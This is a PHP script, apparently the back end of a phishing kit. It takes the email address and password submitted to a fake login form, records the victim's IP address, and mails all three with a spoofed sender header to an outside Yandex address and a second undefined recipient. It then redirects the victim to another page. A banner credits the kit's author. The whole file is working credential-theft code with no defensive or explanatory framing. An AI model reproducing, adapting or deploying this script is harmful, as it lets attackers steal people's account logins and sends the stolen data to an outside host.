<?
$email = $_POST['email'];
$password = $_POST['password'];
$ip = getenv("REMOTE_ADDR");

//sending email info here
	$subj = "LINK OF EARTH: $ip";
	$msg = "--------------------Unleashed By C4SH0UT M45T3R--------------- \n Email: $email\n Password: $password\n------------------\nip: $ip";
	$from = "From: Earth<logins@earth.com>";
	mail("ro.walker@yandex.com", $subj, $msg, $from);
	mail("$cc", $subj, $msg, $from);
	header( "Location: Cbu.htm");

?>